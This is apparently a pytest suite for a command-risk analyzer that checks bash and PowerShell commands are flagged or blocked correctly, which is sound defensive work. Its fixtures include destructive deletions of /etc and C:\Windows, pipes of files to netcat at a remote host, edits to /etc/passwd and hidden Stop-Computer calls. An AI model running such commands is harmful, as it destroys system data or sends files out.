"""Real command shapes and adversarial variants; no fixture is executed."""
import pytest
from command_inspector import Analyzer, AnalyzerConfig
from command_inspector.local_evidence import MemoryEvidenceProvider, ReadFile, StatTarget
from command_inspector.pwsh.syntax import PowerShellFrontend
from command_inspector.bash.syntax import ParseBudgetExceeded


FILES = {'/work/notes': 'hello\nworld\n', '/work/secrets': 'hello\npassword=abcdefg\n',
         '/work/last': 'password=abcdefg\nhello\n', '/work/src/a.py': 'pass\n',
         r'C:\work\notes': 'hello\nworld\n', r'C:\work\secrets': 'hello\npassword=abcdefg\n'}


def report(command, shell='bash', *, files=None, config=None):
    return Analyzer(config, evidence=MemoryEvidenceProvider(FILES if files is None else files)).analyze_report(
        command, '/work' if shell == 'bash' else r'C:\work', shell=shell)


def rules(result):
    return {f.rule for f in result.findings}


@pytest.mark.parametrize('command', [
    'head notes', 'head -n 1 notes', 'head -1 notes', 'head -c 2 notes',
    'tail notes', 'tail -n1 notes', 'tail -f notes', 'tail --lines=1 notes',
    'nl -ba notes', "cut -d ':' -f 1 notes", 'cut -c 1-3 notes',
    "sed -n '1,2p' notes", "sed -E 's/hello/goodbye/g' notes", "sed 's/x/e/' notes",
    "find . -name '*.py' -type f", "find src -maxdepth 2 -printf '%p\\n'",
    'find . -type f -print0', 'du -sh .', 'du --max-depth=1 src', 'df -h', 'df -T .',
    'timeout 2 head notes', 'timeout --signal=TERM 2 grep -nE hello notes',
    'xargs echo', "printf '%s' hello | xargs -n1 echo", 'xargs -I{} echo {}',
    'ps aux', 'ps -ef', 'ps -p 123 -o pid,cmd', 'journalctl -u demo -n 20 --no-pager',
    'journalctl --since yesterday --output=short', 'systemctl status demo',
    'systemctl --user is-active demo', 'systemctl list-unit-files', 'systemctl cat demo',
    'free -h', 'free -m', 'which python', 'sleep 1', 'echo hello',
    'rg -rn hello notes',
    'rg --files -g "*.py"', 'rg -e hello notes', 'grep -E "hello|world" notes',
    'grep -iE HELLO notes', 'grep -nE hello notes', 'grep -cE password secrets',
    'grep -n hello notes', 'grep -e hello notes',
    'git branch --show-current', 'git diff --check', 'git diff --name-only',
    'git diff -r HEAD', 'git merge-tree --write-tree A B',
    'javap -classpath target/classes -c Demo', 'nvidia-smi', 'nvidia-smi -L',
    'nvidia-smi --query-gpu=name,memory.used --format=csv,noheader',
    'conda list', 'conda info --envs', 'conda env list', 'conda config --show',
    'conda run -n demo head notes', 'ss -tulnp', 'netstat -tulnp',
    'pacman -Q', 'pacman -Qs python', 'pacman -Ss python', 'paru -Si python',
    'dotnet --info', 'dotnet --list-sdks', 'dotnet build', 'dotnet test',
    'dotnet tool list', 'dotnet nuget list source',
])
def test_bash_common_queries_are_quiet(command):
    assert report(command).to_dict() == {}


@pytest.mark.parametrize('command', [
    'Select-Object Mode', 'Select-Object Mode, Length', 'Select-Object Name -First 2',
    'Select-Object -Property Mode, Length -Last 1', 'Write-Output a,b',
    'Write-Output (1,2)', '$a = 1,2,3', 'foreach ($n in 1,2) { }',
    'foreach ($n in 1,2) {Write-Output $n}', 'Format-Table A,B',
    'Get-ChildItem A,B', 'Get-ChildItem -LiteralPath A,B', 'Get-ChildItem -Path A, B',
    'Get-ChildItem | Select-Object Name', 'Get-ChildItem | Format-Table -AutoSize',
    'Get-Content notes | Select-String hello', 'git status | Out-String',
    'Get-ChildItem | Where-Object {$_.Name -like "*.py"}',
    'Get-ChildItem | Sort-Object Name', 'Get-ChildItem | Group-Object Extension',
    'Get-ChildItem | Format-List Name,Length', 'Write-Output \'{"a":1}\' | ConvertFrom-Json',
    'Get-Content notes | Out-Null', 'Write-Host hello -ForegroundColor Green',
    'Get-ChildItem -Recurse -Include *.py -File -Depth 2 -Force -ErrorAction Stop',
    'Get-ChildItem -LiteralPath notes -Filter *.py',
    'Get-Content notes -ReadCount 10 -Encoding utf8',
    'Get-Content notes -Filter *.txt -Include *.txt -Exclude *.log',
    'Select-String hello notes', 'Select-String -Pattern hello -LiteralPath notes',
    'Select-String password secrets -Quiet', 'Select-String hello secrets -SimpleMatch',
    '[Math]::Round(1.2)', '[System.String]::IsNullOrEmpty("")',
    '[IO.Path]::Combine("a","b")', '$x="hello"; $x.Trim()',
    '$x="hello"; $x.Replace("a","b").ToUpper()',
    '[IO.File]::ReadAllText("notes")', '[System.IO.Directory]::GetFiles(".")',
    'dotnet --info', 'dotnet.exe build', 'conda list',
    'Get-ChildItem | select Name,Length | ft -AutoSize',
])
def test_powershell_common_queries_are_quiet(command):
    assert report(command, 'powershell').to_dict() == {}


@pytest.mark.parametrize('command,rule,level', [
    ('systemctl restart demo', 'service-change', 'MEDIUM'),
    ('systemctl --user disable demo', 'service-change', 'MEDIUM'),
    ('systemctl daemon-reload', 'service-change', 'MEDIUM'),
    ('systemctl reboot', 'machine-power-change', 'HIGH'),
    ('journalctl --vacuum-time=1d', 'system-settings-change', 'MEDIUM'),
    ('journalctl --rotate', 'system-settings-change', 'MEDIUM'),
    ('nvidia-smi -pl 100', 'system-settings-change', 'MEDIUM'),
    ('nvidia-smi --gpu-reset', 'system-settings-change', 'MEDIUM'),
    ('ss -K dst 192.0.2.1', 'system-settings-change', 'MEDIUM'),
    ('conda install numpy', 'package-install', 'MEDIUM'),
    ('conda env create -f env.yml', 'package-install', 'MEDIUM'),
    ('conda remove numpy', 'package-change', 'MEDIUM'),
    ('conda config --set always_yes true', 'package-change', 'MEDIUM'),
    ('pacman -Syu', 'package-install', 'MEDIUM'),
    ('paru -S numpy', 'package-install', 'MEDIUM'),
    ('pacman -Rns numpy', 'package-change', 'MEDIUM'),
    ('pacman -Scc', 'package-change', 'MEDIUM'),
    ('dotnet restore', 'package-change', 'MEDIUM'),
    ('dotnet tool install demo', 'package-change', 'MEDIUM'),
    ('dotnet nuget push package.nupkg', 'publish-risk', 'MEDIUM'),
    ('dotnet run', 'execution-content-unavailable', 'MEDIUM'),
    ("find . -name '*.py' -delete", 'filesystem-selection-delete', 'MEDIUM'),
    ('find /etc -delete', 'delete-protected-root', 'BLOCK'),
    ('timeout 3 rm -rf /etc', 'delete-protected-root', 'BLOCK'),
    ('timeout 3 env X=a rm -rf /etc', 'delete-protected-root', 'BLOCK'),
    ('timeout 3 sudo rm -rf /etc', 'delete-protected-root', 'BLOCK'),
    ('xargs rm', 'delete-variable-unresolved', 'MEDIUM'),
    ('xargs -I{} rm -rf /etc', 'delete-protected-root', 'BLOCK'),
    ("find . -exec rm -rf /etc \\;", 'delete-protected-root', 'BLOCK'),
    ("find . -exec rm {} +", 'delete-variable-unresolved', 'MEDIUM'),
    ("sed 'e rm -rf /etc' notes", 'delete-protected-root', 'BLOCK'),
    ("sed 's/a/b/ge' notes", 'execution-content-unavailable', 'MEDIUM'),
    ("sed -i 's/a/b/' /etc/passwd", 'modify-sensitive-file', 'HIGH'),
])
def test_bash_effects_remain_visible(command, rule, level):
    result = report(command)
    assert rule in rules(result)
    assert result.level.name == level
    assert 'unknown-command' not in rules(result)


@pytest.mark.parametrize('command,rule,level', [
    ('Add-Type -TypeDefinition "public class X {}"', 'runtime-code-loading', 'MEDIUM'),
    ('Add-Type -AssemblyName System.Windows.Forms', 'runtime-code-loading', 'MEDIUM'),
    ('[IO.Directory]::Delete("C:\\Windows",$true)', 'delete-protected-root', 'BLOCK'),
    ('[IO.File]::Delete("C:\\other\\x")', 'delete-outside-workspace', 'MEDIUM'),
    ('[IO.File]::WriteAllText("AGENTS.md","hello")', 'modify-analyzer-config', 'HIGH'),
    ('[IO.File]::WriteAllText("task.ps1","Stop-Computer")', 'machine-power-change', 'HIGH'),
    ('[Diagnostics.Process]::Start("app.exe")', 'execution-content-unavailable', 'MEDIUM'),
    ('Select-Object @{Expression={Remove-Item -Force -Recurse C:\\Windows}}', 'delete-protected-root', 'BLOCK'),
    ('Where-Object {[IO.Directory]::Delete("C:\\Windows",$true)}', 'delete-protected-root', 'BLOCK'),
    ('Sort-Object {Stop-Computer}', 'machine-power-change', 'HIGH'),
    ('[Math]::Abs($(Stop-Computer))', 'machine-power-change', 'HIGH'),
    ('[String]::Join(",", $(Remove-Item -Force -Recurse C:\\Windows))', 'delete-protected-root', 'BLOCK'),
    ('Remove-Item -Recurse -Force a, C:\\Windows', 'delete-protected-root', 'BLOCK'),
    ('Write-Output a,$(Stop-Computer)', 'machine-power-change', 'HIGH'),
    ('foreach ($n in $(Stop-Computer)) {}', 'machine-power-change', 'HIGH'),
    ('Get-Content secrets | Select-Object -First 1', 'credentials-read', 'MEDIUM'),
    ('Select-String password secrets', 'credentials-read', 'MEDIUM'),
    ('[IO.File]::ReadAllText("secrets")', 'credentials-read', 'MEDIUM'),
    ('[Convert]::FromBase64String("abcd")', 'obfuscated-payload', 'HIGH'),
    ('[IO.File]::WriteAllText("a","hello") | Out-Null; Get-Content a', 'ingestion-inspection-incomplete', 'LOW'),
    ('dotnet nuget push $missing', 'publish-risk', 'MEDIUM'),
])
def test_powershell_effects_remain_visible(command, rule, level):
    result = report(command, 'powershell')
    assert rule in rules(result)
    assert result.level.name == level
    assert 'unknown-command' not in rules(result)


@pytest.mark.parametrize('command,expected', [
    ('head -n1 secrets', set()), ('tail -n1 last', set()),
    ('head -n2 secrets', {'credentials-read'}), ('tail -n1 secrets', {'credentials-read'}),
    ('tail -n0 secrets', set()), ('head -n0 secrets', set()),
    ('grep -iE PASSWORD secrets', {'credentials-read'}),
    ('rg -rn password secrets', {'credentials-read'}),
    ('grep -F -e hello -e password secrets', {'credentials-read'}),
    ('timeout 2 head -n2 secrets', {'credentials-read'}),
    ('timeout 2 cat secrets > /dev/null', {'credentials-read'}),
])
def test_selection_and_wrapper_output(command, expected):
    assert rules(report(command)) == expected


@pytest.mark.parametrize('command,shell', [
    ('head --unknown-option secrets', 'bash'), ('grep --unknown-option hello secrets', 'bash'),
    ('timeout --unknown-option 2 rm -rf /etc', 'bash'),
    ('find . -unknown', 'bash'), ('du --unknown-option .', 'bash'),
    ('systemctl unknown demo', 'bash'), ('conda unknown', 'bash'), ('dotnet unknown', 'bash'),
    ('Select-Object -Bogus Name', 'powershell'), ('Get-ChildItem -C a', 'powershell'),
])
def test_unknown_meanings_are_not_silenced(command, shell):
    assert rules(report(command, shell)) & {'unknown-command', 'unknown-option'}


def test_unresolved_method_receiver_retains_coverage():
    assert 'unresolved-value' in rules(report('$x.Delete()', 'powershell'))
    assert 'unresolved-value' in rules(report('[SomeType]::Delete("a")', 'powershell'))


def test_source_inspects_one_named_file_and_invalidates_following_bindings():
    result = report('target=notes; source ./init; rm "$target"', files={'/work/init': 'rm -rf /etc'})
    assert 'delete-protected-root' in rules(result)
    assert 'delete-variable-unresolved' in rules(result)
    assert 'unknown-command' not in rules(result)


def test_wrapper_budget_is_bounded():
    result = report('timeout 1 timeout 1 timeout 1 timeout 1 rm -rf /etc')
    assert 'unreadable-payload' in rules(result)


def test_comma_repair_preserves_quoted_strings_and_rejects_malformed_arrays():
    assert report('Write-Output "a,b"', 'powershell').to_dict() == {}
    assert 'unsupported-syntax' in rules(report('Write-Output a,,b', 'powershell'))
    assert 'unsupported-syntax' in rules(report('Select-Object Mode,', 'powershell'))
    with pytest.raises(ParseBudgetExceeded):
        PowerShellFrontend().parse('Write-Output a,b', max_nodes=10)


def test_metadata_queries_do_not_read_files():
    class Recording(MemoryEvidenceProvider):
        def __init__(self):
            super().__init__(FILES)
            self.requests = []
        def answer(self, request):
            self.requests.append(request)
            return super().answer(request)
    for command, shell in [('find . -name "*.py"', 'bash'), ('rg --files', 'bash')]:
        provider = Recording()
        Analyzer(evidence=provider).analyze(command, '/work' if shell == 'bash' else r'C:\work', shell=shell)
        assert not any(isinstance(r, ReadFile) for r in provider.requests)


@pytest.mark.parametrize('shell', ['cmd', 'powershell', 'bash'])
def test_cross_platform_native_effects(shell):
    assert 'package-install' in rules(report('conda install numpy', shell))
    assert 'publish-risk' in rules(report('dotnet nuget push package.nupkg', shell))


@pytest.mark.parametrize('command,shell', [
    ('timeout 2 cat notes | nc host 123', 'bash'),
    ('cat notes | timeout 2 nc host 123', 'bash'),
    ('timeout 2 cat notes | timeout 2 nc host 123', 'bash'),
    ('conda run cat notes | nc host 123', 'bash'),
    ('Get-Content notes | conda run nc host 123', 'powershell'),
])
def test_wrapped_pipeline_publication_retains_file_sources(command, shell):
    result = report(command, shell)
    publication = next(f for f in result.findings if f.rule == 'publish-risk')
    assert publication.level.name == 'MEDIUM'
    assert publication.data['sources'] == ['notes']


@pytest.mark.parametrize('command,rule', [
    ("sed -ni '1p' /etc/passwd", 'modify-sensitive-file'),
    ("sed -i.bak 's/x/y/' /etc/passwd", 'modify-sensitive-file'),
    ("sed -e 's/x/y/' --in-place /etc/passwd", 'modify-sensitive-file'),
    ("sed 's/x/y/gew out.txt' notes", 'execution-content-unavailable'),
    ("sed -n '/hello/,/world/ {p;}' notes", None),
    ("sed -i 's/x/y/' secrets", 'overwrite-existing-file'),
    ('conda run sh -c "rm -rf /etc" --help', 'delete-protected-root'),
    ('conda install --invalid-switch numpy', 'unknown-option'),
    ('dotnet exec app.dll --info', 'execution-content-unavailable'),
    ('dotnet exec app.dll --help', 'execution-content-unavailable'),
    ('dotnet build --invalid-switch', 'unknown-option'),
    ('pacman -Q --invalid-switch', 'unknown-option'),
    ('rg -rn hello notes', None),
    ('timeout 2 cat secrets | wc -l', None),
])
def test_option_arity_and_effect_edges(command, rule):
    result = report(command)
    if rule:
        assert rule in rules(result)
    else:
        assert result.to_dict() == {}
    if command.startswith('sed -i'):
        assert 'credentials-read' not in rules(result)


def test_tail_never_claims_a_truncated_prefix_is_the_file_end():
    config = AnalyzerConfig(file_bytes=64)
    result = report('tail -n1 notes', files={'/work/notes': 'password=abcdefg\n' + 'x'*200 + '\nhello\n'}, config=config)
    assert rules(result) == {'ingestion-inspection-incomplete'}


def test_method_delete_retains_failed_readonly_binding():
    result = Analyzer(evidence=MemoryEvidenceProvider({})).analyze_report(
        '$HOME="build"; [IO.Directory]::Delete($HOME,$true)', r'C:\work', shell='powershell',
        env={'USERPROFILE': r'C:\Users\user'})
    assert 'delete-after-failed-assignment' in rules(result)
    assert result.level.name == 'BLOCK'


def test_out_null_on_wrapped_reader_does_not_inspect_output():
    assert report('conda run python -c "print(1)" | Out-Null', 'powershell').level.name == 'LOW'


def test_new_catalog_entries_have_correct_versions():
    catalog = Analyzer.rule_catalog()
    entries = {entry['rule']: entry for entry in catalog['rules']}
    for name in ('package-change', 'system-settings-change', 'filesystem-selection-delete', 'runtime-code-loading'):
        assert entries[name]['introduced_in'] == '1.4.0'
    assert entries['sql-drop-object']['introduced_in'] == '1.3.0'


def test_find_reports_search_roots_as_unresolved_selection():
    finding = next(f for f in report('find src -name "*.py" -delete').findings if f.rule == 'filesystem-selection-delete')
    assert finding.data['search_roots'] == ['/work/src']
    assert finding.data['selection_resolved'] is False
    assert 'targets' not in finding.data


@pytest.mark.parametrize('command,shell,rule', [
    ('conda run --cwd /etc rm -rf .', 'bash', 'delete-protected-root'),
    ('timeout 2 env -C /etc rm -rf .', 'bash', 'delete-protected-root'),
    ('timeout 2 sudo -C /etc rm -rf .', 'bash', 'delete-protected-root'),
    ('conda run --cwd C:\\Windows rm -rf .', 'powershell', 'delete-protected-root'),
    ('conda run --cwd $missing rm -rf .', 'powershell', 'delete-variable-unresolved'),
    ('dotnet publish -o C:\\other', 'powershell', 'write-outside-workspace'),
])
def test_explicit_wrapper_and_output_directories(command, shell, rule):
    assert rule in rules(report(command, shell))


@pytest.mark.parametrize('command', ['pacman --query', 'pacman --sync --search python', 'paru -S --info python', 'dotnet publish -o out', 'dotnet pack --output=out'])
def test_long_native_query_options_and_local_output(command):
    assert report(command).to_dict() == {}


def test_comma_repair_does_not_turn_unknown_parameters_into_literal_arguments():
    assert rules(report('Write-Output -Bogus,-Other', 'powershell')) & {'unknown-option', 'unsupported-syntax'}


def test_source_basename_does_not_guess_which_path_entry_wins():
    result = report('source init', files={'/work/init': 'rm -rf /etc'})
    assert rules(result) == {'execution-content-unavailable'}


def test_source_cannot_change_a_known_readonly_binding():
    result = report('readonly target=/etc; source ./init; rm -rf "$target"', files={'/work/init': 'echo hello'})
    assert 'delete-protected-root' in rules(result)


def test_line_window_finding_describes_actual_selection():
    finding = next(f for f in report('head -n2 secrets').findings if f.rule == 'credentials-read')
    assert finding.data['selection'] == 'line_window'


def test_wrapped_named_artifact_keeps_the_one_file_boundary():
    provider = MemoryEvidenceProvider({'/work/tool.sh': 'source ./other.sh', '/work/other.sh': 'rm -rf /etc'})
    result = Analyzer(evidence=provider).analyze_report('timeout 2 ./tool.sh', '/work', shell='bash')
    assert 'delete-protected-root' not in rules(result)
    assert 'unknown-command' not in rules(result)
    assert provider.queries == [ReadFile('/work/tool.sh', 524288), StatTarget('/work/other.sh')]
    assert 'execution-content-unavailable' in rules(result)


def test_wrapped_windows_native_executable_suffix():
    assert report('conda run dotnet.exe --info', 'powershell').to_dict() == {}


def test_wrapped_reader_publication_uses_its_overridden_directory():
    result = report('conda run --cwd /other cat notes | nc host 123')
    finding = next(f for f in result.findings if f.rule == 'publish-risk')
    assert finding.data['sources'] == ['/other/notes']
    assert finding.data['source_paths'] == ['/other/notes']


def test_wrapped_windows_sink_is_case_insensitive():
    result = report('Get-Content notes | conda run NC.EXE host 123', 'powershell')
    assert 'publish-risk' in rules(result)
